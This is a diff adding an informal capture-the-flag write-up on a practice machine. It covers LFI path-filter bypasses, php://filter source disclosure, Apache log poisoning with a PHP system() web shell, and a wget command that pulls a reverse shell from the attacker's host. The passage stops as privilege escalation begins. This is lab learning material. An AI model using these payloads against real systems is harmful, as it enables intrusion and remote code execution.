@@ -1,0 +1,104 @@
+1. started of with nmap scan as usaul and found port
+    1. 80-http open
+    2. 22-ssh open
+
+---
+
+1. skipped over ssh since bruteforce isnt the way and started enuming http
+    1. website didnt have much and neither did the sub dirs
+    2. but i did find a email “john@mafialive.thm” which looks like a domain name
+    3. so i put that into my hosts file and went to it, and it was a domain name
+
+---
+
+1. so i started enumeratiob on it
+    1. found test.php
+    2. /robots.txt
+        1. inside this was just/text.php
+
+---
+
+1. on the test.php page it had a button when clicked loaded mrrobot.php and when i looked at the url i saw it was ?view=/var/www/html/development_testing, this means its vulnerable to LFI
+
+---
+
+1. i tried basic inputs like ../../etc/passwd but nothing was working so did some googling and found i could use
+
+```python
+view=php://filter/convert.bas64-encode/resource=/
+```
+
+basically what this does is it takes in an input and encodes it to base64, and this can bypass filters stopping me from viewing stuff, so i used that command to show me text.php source code
+
+```python
+view=php://filter/convert.bas64-encode/resource=/var/www/html/development_testing/test.php
+```
+
+this gave me the base64 encoded test of the page which allowed me to check the rules that are in place
+
+1. URL must not include ../..
+2. URL must include /var/www/development_testing
+
+and to bypass the ../.. rule i could use ..//.. since linux sees it the same as ../..
+
+so now i could craft a payload, i tested this by using
+
+```python
+view=/var/www/html/development_testing//..//..//..//..//etc/passwd
+```
+
+and it worked i was able to see /etc/passwd
+
+---
+
+1. Now i had to get a reverse shell somehow and my hint was poisining, so after some googling i found out i could poisen the /var/log/apache2/access.log file, the steps to do this are
+    1. capture the request using burp suite (the request must be to the base /test.php) not anything else
+    2. change the User-Agent header by putting in a PHP payload
+        
+        ```python
+        <?php system($_GET['cmd']); ?>
+        ```
+        
+        now whenever i request the log file i can execute this function for whatever command i wanted since it takes in the command from cmd= and uses system to execute it on the host 
+        
+    
+    ---
+    
+    1. Now i use LFI to access the log file
+        
+        ```python
+        view=/var/www/html/development_testing//..//..//..//log/apache2/access.log
+        ```
+        
+        and then i add my cmd command
+        
+        ```python
+        view=/var/www/html/development_testing//..//..//..//log/apache2/access.log&cmd=uname
+        ```
+        
+        and it worked it output the host details, now that i know its been poisend i can use wget to upload a reverse shell to the machine 
+        
+    
+    ---
+    
+    1. so first i have to start a python3 web server in the file the script is in, then using the LFI with the php script injection i can use wget to download it
+    
+    ```python
+    view=/var/www/html/development_testing//..//..//..//log/apache2/access.log&cmd=wget%20http://10.4.49.64/shell.php
+    ```
+    
+    now that the script is downloaded onto the machine i simply make the server run it by calling it
+    
+    ```python
+    http://mafialive.thm/shell.php
+    ```
+    
+    and in my listener i have caught it
+    
+    ---
+    
+    1. now onto priv escalation, 
+    
+    ---
+    
+    1. after some enumeration i found a cronjob
